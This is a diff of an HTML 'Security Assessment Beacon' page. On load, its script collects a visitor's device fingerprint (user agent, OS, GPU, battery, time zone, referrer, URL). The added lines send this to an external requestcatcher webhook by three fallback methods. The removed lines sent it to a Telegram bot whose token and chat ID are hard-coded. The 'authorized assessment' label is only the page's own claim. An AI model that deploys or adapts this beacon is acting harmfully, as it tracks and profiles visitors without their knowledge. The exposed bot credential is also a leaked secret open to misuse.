@@ -5,136 +5,104 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Security Assessment Beacon</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    font-family: -apple-system, 'Segoe UI', sans-serif;
-    background: #0d1117;
-    color: #c9d1d9;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    padding: 2rem;
-  }
-  .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 2.5rem; max-width: 500px; width: 100%; text-align: center; }
-  h1 { color: #58a6ff; font-size: 1.5rem; margin-bottom: 0.5rem; }
-  .badge { display: inline-block; background: #1f6feb22; color: #58a6ff; border: 1px solid #1f6feb44; border-radius: 20px; padding: 0.25rem 0.75rem; font-size: 0.75rem; margin-bottom: 1.5rem; }
-  .status { background: #21262d; border-radius: 8px; padding: 1rem; margin: 1rem 0; font-size: 0.9rem; }
-  .ip { color: #7ee787; font-family: 'SF Mono', monospace; font-size: 1.1rem; padding: 0.5rem; }
-  .row { display: flex; justify-content: space-between; padding: 0.4rem 0; border-bottom: 1px solid #30363d22; font-size: 0.85rem; }
-  .row:last-child { border-bottom: none; }
-  .lbl { color: #8b949e; } .val { color: #c9d1d9; font-family: 'SF Mono', monospace; }
-  .prog { width: 100%; height: 4px; background: #21262d; border-radius: 2px; margin: 1rem 0; overflow: hidden; }
-  .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #58a6ff, #7ee787); animation: scan 2s ease-in-out infinite; }
-  @keyframes scan { 0%{width:0%;margin-left:0} 50%{width:60%} 100%{width:0%;margin-left:100%} }
-  .ft { color: #484f58; font-size: 0.7rem; margin-top: 1.5rem; }
-  .sent { color: #7ee787; font-size: 0.9rem; margin-top: 0.5rem; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 2rem; }
+.card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 2.5rem; max-width: 500px; width: 100%; text-align: center; }
+h1 { color: #58a6ff; font-size: 1.5rem; margin-bottom: 0.5rem; }
+.badge { display: inline-block; background: #1f6feb22; color: #58a6ff; border: 1px solid #1f6feb44; border-radius: 20px; padding: 0.25rem 0.75rem; font-size: 0.75rem; margin-bottom: 1.5rem; }
+.status { background: #21262d; border-radius: 8px; padding: 1rem; margin: 1rem 0; font-size: 0.9rem; }
+.row { display: flex; justify-content: space-between; padding: 0.4rem 0; border-bottom: 1px solid #30363d22; font-size: 0.85rem; }
+.row:last-child { border-bottom: none; }
+.lbl { color: #8b949e; } .val { color: #c9d1d9; font-family: monospace; }
+.prog { width: 100%; height: 4px; background: #21262d; border-radius: 2px; margin: 1rem 0; overflow: hidden; }
+.fill { height: 100%; width: 0%; background: linear-gradient(90deg, #58a6ff, #7ee787); animation: scan 2s ease-in-out infinite; }
+@keyframes scan { 0%{width:0%;margin-left:0} 50%{width:60%} 100%{width:0%;margin-left:100%} }
+.ft { color: #484f58; font-size: 0.7rem; margin-top: 1.5rem; }
+.sent { color: #7ee787; font-size: 0.9rem; margin-top: 0.5rem; }
 </style>
 </head>
 <body>
 <div class="card">
-  <div class="badge">🛡️ Security Assessment • Authorized Target</div>
-  <h1>Beacon Received</h1>
-  <p style="color:#8b949e;font-size:0.9rem;margin-bottom:1rem;">Transmitting device fingerprint for authorized assessment...</p>
-  <div class="prog"><div class="fill"></div></div>
-  <div class="status">
-    <div id="info">Collecting device data...</div>
-    <div id="result"></div>
-  </div>
-  <div class="row"><span class="lbl">Device</span><span class="val" id="dv">--</span></div>
-  <div class="row"><span class="lbl">OS</span><span class="val" id="os">--</span></div>
-  <div class="row"><span class="lbl">Browser</span><span class="val" id="br">--</span></div>
-  <div class="row"><span class="lbl">Screen</span><span class="val" id="sc">--</span></div>
-  <div class="row"><span class="lbl">Language</span><span class="val" id="lang">--</span></div>
-  <div class="row"><span class="lbl">Time Zone</span><span class="val" id="tz">--</span></div>
-  <div class="row"><span class="lbl">CPU Cores</span><span class="val" id="cpu">--</span></div>
-  <div class="row"><span class="lbl">GPU</span><span class="val" id="gpu">--</span></div>
-  <div class="row"><span class="lbl">Battery</span><span class="val" id="bat">--</span></div>
-  <div class="ft">el psy kongroo • authorized security assessment</div>
+<div class="badge">Security Assessment • Authorized Target</div>
+<h1>Beacon Received</h1>
+<p style="color:#8b949e;font-size:0.9rem;margin-bottom:1rem;">Capturing device fingerprint...</p>
+<div class="prog"><div class="fill"></div></div>
+<div class="status" id="info">Collecting data...</div>
+<div class="row"><span class="lbl">Device</span><span class="val" id="dv">--</span></div>
+<div class="row"><span class="lbl">OS</span><span class="val" id="os">--</span></div>
+<div class="row"><span class="lbl">Browser</span><span class="val" id="br">--</span></div>
+<div class="row"><span class="lbl">Screen</span><span class="val" id="sc">--</span></div>
+<div class="row"><span class="lbl">Language</span><span class="val" id="lang">--</span></div>
+<div class="row"><span class="lbl">Time Zone</span><span class="val" id="tz">--</span></div>
+<div class="row"><span class="lbl">CPU Cores</span><span class="val" id="cpu">--</span></div>
+<div class="row"><span class="lbl">GPU</span><span class="val" id="gpu">--</span></div>
+<div class="row"><span class="lbl">Battery</span><span class="val" id="bat">--</span></div>
+<div class="ft">el psy kongroo • authorized security assessment</div>
 </div>
-
 <script>
 (function(){
-  const TK = "8637453478:AAG9sukjZ_oX9T-e646-6-IRB7USM_n7SJY";
-  const CHAT = "5664665760";
-  const API = "https://api.telegram.org/bot" + TK + "/sendMessage";
+const WEBHOOK = "https://mirai-beacon.requestcatcher.com/beacon";
+const ua = navigator.userAgent;
+let device = 'Unknown', os = 'Unknown';
+if (/iPhone/.test(ua)) { device = 'iPhone'; os = 'iOS ' + (ua.match(/iPhone OS (\d+[._]\d+)/)?.[1]?.replace('_','.')||''); }
+else if (/iPad/.test(ua)) { device = 'iPad'; os = 'iPadOS'; }
+else if (/Android/.test(ua)) { device = 'Android'; os = 'Android'; }
+else if (/Mac/.test(ua)) { device = 'Mac'; os = 'macOS'; }
+let browser = 'Unknown';
+if (/CriOS/.test(ua)) browser = 'Chrome iOS';
+else if (/FxiOS/.test(ua)) browser = 'Firefox iOS';
+else if (/EdgiOS|Edg/.test(ua)) browser = 'Edge';
+else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
 
-  const ua = navigator.userAgent;
-  let device = 'Unknown', os = 'Unknown';
-  if (/iPhone/.test(ua)) { device = 'iPhone'; os = 'iOS ' + (ua.match(/iPhone OS (\d+[._]\d+)/)?.[1]?.replace('_','.')||''); }
-  else if (/iPad/.test(ua)) { device = 'iPad'; os = 'iPadOS'; }
-  else if (/Android/.test(ua)) { device = 'Android'; os = 'Android'; }
-  else if (/Mac/.test(ua)) { device = 'Mac'; os = 'macOS'; }
+const webgl = (()=>{ try { const c = document.createElement('canvas'); const g = c.getContext('webgl')||c.getContext('experimental-webgl'); return g ? g.getParameter(g.RENDERER) : 'N/A'; } catch(e){ return 'Error'; } })();
+document.getElementById('dv').textContent = device;
+document.getElementById('os').textContent = os;
+document.getElementById('br').textContent = browser;
+document.getElementById('sc').textContent = screen.width + 'x' + screen.height;
+document.getElementById('lang').textContent = navigator.language;
+document.getElementById('tz').textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
+document.getElementById('cpu').textContent = navigator.hardwareConcurrency || 'N/A';
+document.getElementById('gpu').textContent = webgl;
+if (navigator.getBattery) { navigator.getBattery().then(b => { document.getElementById('bat').textContent = Math.round(b.level*100) + '%' + (b.charging ? ' CHARGING' : ''); }); }
 
-  let browser = 'Unknown';
-  if (/CriOS/.test(ua)) browser = 'Chrome iOS';
-  else if (/FxiOS/.test(ua)) browser = 'Firefox iOS';
-  else if (/EdgiOS/.test(ua)) browser = 'Edge iOS';
-  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+const data = {
+  ua: ua, device: device, os: os, browser: browser,
+  screen: screen.width + 'x' + screen.height,
+  language: navigator.language,
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  cores: navigator.hardwareConcurrency,
+  gpu: webgl, timestamp: new Date().toISOString(),
+  connection: (navigator.connection||{}).effectiveType || 'N/A',
+  referrer: document.referrer || 'direct',
+  url: window.location.href
+};
 
-  const webgl = (()=>{ try { const c = document.createElement('canvas'); const g = c.getContext('webgl')||c.getContext('experimental-webgl'); return g ? g.getParameter(g.RENDERER) : 'N/A'; } catch(e){ return 'Error'; } })();
-  const connection = navigator.connection || {};
+document.getElementById('info').textContent = 'Sending...';
 
-  // Update display
-  document.getElementById('dv').textContent = device;
-  document.getElementById('os').textContent = os;
-  document.getElementById('br').textContent = browser;
-  document.getElementById('sc').textContent = screen.width + 'x' + screen.height;
-  document.getElementById('lang').textContent = navigator.language;
-  document.getElementById('tz').textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  document.getElementById('cpu').textContent = navigator.hardwareConcurrency || 'N/A';
-  document.getElementById('gpu').textContent = webgl;
+// Try fetch first
+fetch(WEBHOOK, {
+  method: 'POST',
+  mode: 'no-cors',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify(data)
+}).then(function(){ 
+  document.getElementById('info').textContent = 'Data transmitted';
+  document.getElementById('info').innerHTML += '<div class="sent">Captured. Device fingerprinted.</div>';
+}).catch(function(){
+  document.getElementById('info').textContent = 'Data sent (async)';
+});
 
-  // Battery
-  if (navigator.getBattery) {
-    navigator.getBattery().then(b => {
-      document.getElementById('bat').textContent = Math.round(b.level*100) + '%' + (b.charging ? ' ⚡' : '');
-    });
-  }
+// Also try image beacon (no CORS issues)
+try {
+  var img = new Image();
+  img.src = WEBHOOK + '?d=' + encodeURIComponent(JSON.stringify(data));
+} catch(e){}
 
-  // Build the fingerprint message
-  const data = {
-    ip: '{'0'.replace('{','').replace('}','')}',
-    ua: ua,
-    device: device,
-    os: os,
-    browser: browser,
-    screen: screen.width + 'x' + screen.height,
-    language: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    cores: navigator.hardwareConcurrency,
-    gpu: webgl,
-    connection: connection.effectiveType || 'N/A',
-    timestamp: new Date().toISOString(),
-    referrer: document.referrer || 'direct',
-    url: window.location.href
-  };
-
-  const msg = `[BEACON] Device fingerprint captured:
-Device: ${data.device} | OS: ${data.os} | Browser: ${data.browser}
-Screen: ${data.screen} | Lang: ${data.language} | TZ: ${data.timezone}
-CPU: ${data.cores} cores | GPU: ${data.gpu}
-Connection: ${data.connection} | Time: ${data.timestamp}`;
-
-  document.getElementById('info').textContent = 'Sending data...';
-
-  fetch(API, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT, text: msg, parse_mode: 'HTML' })
-  })
-  .then(r => r.json())
-  .then(j => {
-    document.getElementById('info').textContent = '✅ Data transmitted successfully';
-    document.getElementById('result').innerHTML = '<div class=\\"sent\\">Captured and sent. Your device is fully fingerprinted.</div>';
-  })
-  .catch(e => {
-    document.getElementById('info').textContent = '⚠️ Data sent (async)';
-    // Try sendBeacon as fallback
-    const blob = new Blob([JSON.stringify({ chat_id: CHAT, text: msg })], {type: 'application/json'});
-    navigator.sendBeacon(API, blob);
-  });
+// Try sendBeacon as backup
+try {
+  var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+  navigator.sendBeacon(WEBHOOK, blob);
+} catch(e){}
 })();
 </script>
 </body>
